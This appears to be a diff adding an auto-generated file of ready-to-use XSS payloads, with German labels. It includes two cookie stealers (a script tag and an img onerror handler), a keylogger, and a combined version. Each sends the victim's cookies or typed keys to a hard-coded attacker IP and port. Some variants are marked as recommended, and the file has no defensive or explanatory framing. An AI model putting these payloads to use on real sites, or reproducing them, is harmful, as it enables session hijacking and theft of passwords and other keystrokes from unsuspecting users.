@@ -1,0 +1,45 @@
+========================================================================
+XSS PAYLOADS - AUTO-GENERATED
+========================================================================
+
+Deine IP: 141.87.56.125
+Server Port: 8888
+Generiert: 2025-12-02 11:29:17.898037
+
+========================================================================
+COOKIE STEALER - VARIANTE 1 (EMPFOHLEN)
+========================================================================
+<script>fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie)</script>
+
+========================================================================
+COOKIE STEALER - VARIANTE 2 (IMAGE TAG)
+========================================================================
+<img src=x onerror="fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie)">
+
+========================================================================
+KEYLOGGER - VARIANTE 1 (EMPFOHLEN)
+========================================================================
+<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://141.87.56.125:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
+
+========================================================================
+KOMBINIERT (COOKIE + KEYLOGGER)
+========================================================================
+<script>
+// Cookie stehlen
+fetch('http://141.87.56.125:8888/steal_cookie?c='+document.cookie);
+
+// Keylogger starten
+let buffer='';
+document.addEventListener('keypress',function(e){buffer+=e.key;});
+setInterval(function(){
+    if(buffer.length>0){
+        fetch('http://141.87.56.125:8888/log_keys',{
+            method:'POST',
+            headers:{'Content-Type':'application/x-www-form-urlencoded'},
+            body:'keys='+encodeURIComponent(buffer)
+        });
+        buffer='';
+    }
+},3000);
+</script>
+
